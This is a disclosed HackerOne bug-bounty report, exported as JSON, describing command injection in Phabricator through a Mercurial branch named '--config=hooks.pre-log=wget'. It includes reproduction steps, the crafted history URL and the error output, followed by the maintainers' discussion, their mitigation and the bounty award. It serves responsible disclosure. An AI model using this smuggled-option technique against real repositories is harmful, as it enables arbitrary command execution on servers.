            "markdown_message": "<p>I think the goal of the hook feature is designed to be executed as a high priority than other command options so that there&#39;re pre-command,post-command and fail-command kind of hooks here.Also the --config is a global hg option and not for some certain sub-command.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2146276, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-11-09T16:12:31.536Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-11-09T16:12:31.536Z", 
            "actor": {
                "username": "epriestley", 
                "url": "/epriestley", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/043/67210f4155bb8999679d01c81406df1242df0f8c_medium.jpg?1383694450"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "Mercurial security replied, and said that they expect to respond today or tomorrow.\n\n(The upstream task for this is <https://secure.phabricator.com/T13012>, although it's not currently public.)\n\nWe tentatively have a patch ready for this when Mercurial makes a decision.", 
            "markdown_message": "<p>Mercurial security replied, and said that they expect to respond today or tomorrow.</p>\n\n<p>(The upstream task for this is <a title=\"https://secure.phabricator.com/T13012\" href=\"/redirect?signature=7e9c1884c6ec9e98605b230d7d81429d5c1179b0&amp;url=https%3A%2F%2Fsecure.phabricator.com%2FT13012\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://secure.phabricator.com/T13012</span><i class=\"icon-external-link\"></i></a>, although it&#39;s not currently public.)</p>\n\n<p>We tentatively have a patch ready for this when Mercurial makes a decision.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2146585, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-11-09T22:26:54.143Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-11-09T22:26:54.143Z", 
            "actor": {
                "username": "pnig0s", 
                "url": "/pnig0s", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/213/ac13b217c6244e5d4e8ef3ef7e4b54d4ecd9aaa7_medium.jpg?1527294106"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "Mercurial had already mentioned the risk about this kind issue in https://www.mercurial-scm.org/repo/hg/rev/77eaf9539499\n```\nWe're not currently hardening any subcommands other than 'serve'. If\nyour service exposes other commands to users with arbitrary repository\nnames, it is imperative that you defend against repository names of\n'--debugger' and anything starting with '--config'.\n```", 
            "markdown_message": "<p>Mercurial had already mentioned the risk about this kind issue in <a title=\"https://www.mercurial-scm.org/repo/hg/rev/77eaf9539499\" href=\"/redirect?signature=35a5b6a7a14daa8c27e16253c8f17f08520dd90a&amp;url=https%3A%2F%2Fwww.mercurial-scm.org%2Frepo%2Fhg%2Frev%2F77eaf9539499\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.mercurial-scm.org/repo/hg/rev/77eaf9539499</span><i class=\"icon-external-link\"></i></a></p>\n<pre class=\"highlight plaintext\"><code>We&#39;re not currently hardening any subcommands other than &#39;serve&#39;. If\nyour service exposes other commands to users with arbitrary repository\nnames, it is imperative that you defend against repository names of\n&#39;--debugger&#39; and anything starting with &#39;--config&#39;.\n</code></pre>", 
            "type": "Activities::Comment", 
            "id": 2147602, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-11-09T22:43:35.959Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-11-09T22:43:35.959Z", 
            "actor": {
                "username": "epriestley", 
                "url": "/epriestley", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/043/67210f4155bb8999679d01c81406df1242df0f8c_medium.jpg?1383694450"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "I think Mercurial's behavior is *clearly* wrong. Consider this:\n\n```\n$ hg grep -- --debugger\nentering debugger - type c to continue starting hg or h for help\n...\n```\n\nThey may choose not to fix it, but the magical, nonstandard, dangerous behavior of the `--config` and `--debugger` flags is clearly a problem with Mercurial and their \"messy implementation of argument parsing\", not a reasonable caveat which implementors building on top of `hg` should be expected to anticipate.", 
            "markdown_message": "<p>I think Mercurial&#39;s behavior is <em>clearly</em> wrong. Consider this:</p>\n<pre class=\"highlight plaintext\"><code>$ hg grep -- --debugger\nentering debugger - type c to continue starting hg or h for help\n...\n</code></pre>\n<p>They may choose not to fix it, but the magical, nonstandard, dangerous behavior of the <code>--config</code> and <code>--debugger</code> flags is clearly a problem with Mercurial and their &quot;messy implementation of argument parsing&quot;, not a reasonable caveat which implementors building on top of <code>hg</code> should be expected to anticipate.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2147658, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-11-09T23:02:34.275Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-11-09T23:02:34.275Z", 
            "actor": {
                "username": "pnig0s", 
                "url": "/pnig0s", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/213/ac13b217c6244e5d4e8ef3ef7e4b54d4ecd9aaa7_medium.jpg?1527294106"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "I just think mercurial can't be totally blamed by this.Application using mercurial do have ways to mitigate this kind risk.This is not a directly vulnerability like the serve sub-command.It's just some kind dangerous feature that other developer should be careful with.And directly using user input as the option of command is definely not a safe and good practice.Today is mercurial,maybe there's other application have these kind features,you can't blame them all.Other application support mercurial like Bitbucket not affected by this issue at all.Maybe mercurial will hardern this or maybe not.But the responsibility from phabricator side still can't be ignored.", 
            "markdown_message": "<p>I just think mercurial can&#39;t be totally blamed by this.Application using mercurial do have ways to mitigate this kind risk.This is not a directly vulnerability like the serve sub-command.It&#39;s just some kind dangerous feature that other developer should be careful with.And directly using user input as the option of command is definely not a safe and good practice.Today is mercurial,maybe there&#39;s other application have these kind features,you can&#39;t blame them all.Other application support mercurial like Bitbucket not affected by this issue at all.Maybe mercurial will hardern this or maybe not.But the responsibility from phabricator side still can&#39;t be ignored.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2147689, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-11-09T23:05:47.627Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-11-09T23:05:47.627Z", 
            "actor": {
                "username": "pnig0s", 
                "url": "/pnig0s", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/213/ac13b217c6244e5d4e8ef3ef7e4b54d4ecd9aaa7_medium.jpg?1527294106"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "You can't make every application you execute with all safe,so the key point here is how to safely invoke them to mitigate the risk.", 
            "markdown_message": "<p>You can&#39;t make every application you execute with all safe,so the key point here is how to safely invoke them to mitigate the risk.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2147695, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-11-09T23:38:13.216Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-11-09T23:38:13.216Z", 
            "actor": {
                "username": "amckinley", 
                "url": "/amckinley", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "I believe Evan's point is that Mercurial's approach makes it *very* difficult to safely invoke the `hg` binary. We'll definitely work around this issue in Phabricator if Mercurial decides not to fix it, but I agree with Evan that this would be much better fixed in the upstream. There's nothing to prevent Mercurial from adding additional `--do-something-dangerous` flags forever that we'll need to explicitly check for in our code.", 
            "markdown_message": "<p>I believe Evan&#39;s point is that Mercurial&#39;s approach makes it <em>very</em> difficult to safely invoke the <code>hg</code> binary. We&#39;ll definitely work around this issue in Phabricator if Mercurial decides not to fix it, but I agree with Evan that this would be much better fixed in the upstream. There&#39;s nothing to prevent Mercurial from adding additional <code>--do-something-dangerous</code> flags forever that we&#39;ll need to explicitly check for in our code.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2147778, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "pnig0s", 
                "url": "/pnig0s"
            }, 
            "created_at": "2017-11-10T16:48:28.468Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-11-10T16:48:28.468Z", 
            "actor": {
                "username": "epriestley", 
                "url": "/epriestley", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/043/67210f4155bb8999679d01c81406df1242df0f8c_medium.jpg?1383694450"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "Mercurial plans to mitigate this in a future release several weeks from now, so we've landed our mitigations immediately.\n\nSee <https://secure.phabricator.com/T13012> for details. (That task will be updated with more information shortly.)", 
            "markdown_message": "<p>Mercurial plans to mitigate this in a future release several weeks from now, so we&#39;ve landed our mitigations immediately.</p>\n\n<p>See <a title=\"https://secure.phabricator.com/T13012\" href=\"/redirect?signature=7e9c1884c6ec9e98605b230d7d81429d5c1179b0&amp;url=https%3A%2F%2Fsecure.phabricator.com%2FT13012\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://secure.phabricator.com/T13012</span><i class=\"icon-external-link\"></i></a> for details. (That task will be updated with more information shortly.)</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 2149714, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2017-11-10T16:49:37.804Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-11-10T16:49:37.804Z", 
            "actor": {
                "url": "/phabricator", 
                "profile": {
                    "name": "Phabricator"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/018/29aa105aca62b26e62c64e57c902e5db2bb8daf6_medium.jpg?1487955532"
                }
            }, 
            "team_handle": "phabricator", 
            "bonus_amount": "0.0", 
            "bounty_amount": "1000.0", 
            "collaborator": {
                "username": "pnig0s", 
                "url": "/pnig0s"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 2149715, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-11-10T16:49:58.568Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-11-10T16:49:58.568Z", 
            "actor": {
                "username": "epriestley", 
                "url": "/epriestley", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/043/67210f4155bb8999679d01c81406df1242df0f8c_medium.jpg?1383694450"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "first_to_agree": true, 
            "message": "Details are publicly available, so this can be disclosed at any time.", 
            "markdown_message": "<p>Details are publicly available, so this can be disclosed at any time.</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 2149716, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-11-11T00:42:44.014Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-11-11T00:42:44.014Z", 
            "actor": {
                "username": "pnig0s", 
                "url": "/pnig0s", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/213/ac13b217c6244e5d4e8ef3ef7e4b54d4ecd9aaa7_medium.jpg?1527294106"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "Ok let's make it go public.", 
            "markdown_message": "<p>Ok let&#39;s make it go public.</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 2150634, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-11-11T00:42:44.170Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-11-11T00:42:44.170Z", 
            "actor": {
                "username": "pnig0s", 
                "url": "/pnig0s", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/213/ac13b217c6244e5d4e8ef3ef7e4b54d4ecd9aaa7_medium.jpg?1527294106"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 2150635, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-11-11T00:48:34.565Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-11-11T00:48:34.565Z", 
            "actor": {
                "username": "pnig0s", 
                "url": "/pnig0s", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/213/ac13b217c6244e5d4e8ef3ef7e4b54d4ecd9aaa7_medium.jpg?1527294106"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "BTW:How can i track the details of the mitigation from mercurial side?", 
            "markdown_message": "<p>BTW:How can i track the details of the mitigation from mercurial side?</p>\n", 
            "type": "Activities::Comment", 
            "id": 2150655, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-11-11T17:26:41.538Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-11-11T17:26:41.538Z", 
            "actor": {
                "username": "epriestley", 
                "url": "/epriestley", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/043/67210f4155bb8999679d01c81406df1242df0f8c_medium.jpg?1383694450"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "phabricator", 
            "message": "I'm not sure, I don't have any more information than what I posted in <https://secure.phabricator.com/T13012>.", 
            "markdown_message": "<p>I&#39;m not sure, I don&#39;t have any more information than what I posted in <a title=\"https://secure.phabricator.com/T13012\" href=\"/redirect?signature=7e9c1884c6ec9e98605b230d7d81429d5c1179b0&amp;url=https%3A%2F%2Fsecure.phabricator.com%2FT13012\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://secure.phabricator.com/T13012</span><i class=\"icon-external-link\"></i></a>.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2151534, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "pnig0s", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/pnig0s", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/004/213/9c4eed3ecf42e7c31086ea7235e8b2e1ce1e5070_small.jpg?1527294106"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 58, 
        "name": "Command Injection - Generic"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -31210789.310591053, 
    "disclosed_at": "2017-11-11T00:42:44.118Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/288704", 
    "created_at": "2017-11-09T08:57:35.077Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Hi phabricator,</p>\n\n<p>I found an evil branch name of hg a repo can lead to arbitrary command injection on phabricator instance.</p>\n\n<p>Here is the reproduction steps:</p>\n\n<ol>\n<li>Monitor a remote mercurial repo with phabricator;</li>\n<li>Create a branch and called &quot;--config=hooks.pre-log=wget&quot; on the remote;</li>\n<li>After phabricator update the remote repo,visit the history page of that crafted branch;\n<code>\nhttp://instanceip/source/hgclone/history/--config%253Dhooks.pre-log%253Dwget/\n</code>\n</li>\n<li>It will raise an error like below and the wget command will be executed;</li>\n<li>I test this issue both on my own server instance and the cloud instance with mercurial 4.4(latest) installed(on my server).</li>\n</ol>\n<pre class=\"highlight plaintext\"><code>Command failed with error #255! COMMAND hg --config ui.ssh=&#39;/data/phabricator/phabricator/bin/ssh-\nconnect&#39; log --debug --template &#39;{node};{parents}\\n&#39; --limit 101 -b &#39;--config=hooks.pre-log=wget&#39; --rev \n&#39;reverse(ancestors(&#39;\\&#39;&#39;84e8c5feb4faba2f1b230575e747c3bffe7c7a3c&#39;\\&#39;&#39;))&#39; STDOUT running hook pre-log: \nwget STDERR not trusting file /var/repo/3/.hg/hgrc from untrusted user root, group root not trusting file \n/var/repo/3/.hg/hgrc from untrusted user root, group root wget: missing URL Usage: wget [OPTION]... \n[URL]... Try `wget --help&#39; for more options. abort: pre-log hook exited with status 1\n</code></pre>\n<p>The root cause is that the branch name inject to the hg command directly and that define a hook will run before the hg log command been executed.<br>\nThanks!</p>\n", 
    "severity_rating": "critical", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://phacility.com/phabricator/", 
            "about": "Phabricator is a collection of open source web applications that help software companies build better software.", 
            "twitter_handle": "phabricator", 
            "name": "Phabricator"
        }, 
        "handle": "phabricator", 
        "url": "https://hackerone.com/phabricator", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/018/8f0130b0439b00cdeeddd76246ec8063cac6495f_small.jpg?1487955532", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/018/29aa105aca62b26e62c64e57c902e5db2bb8daf6_medium.jpg?1487955532"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 18, 
        "default_currency": "usd"
    }, 
    "is_published": false
}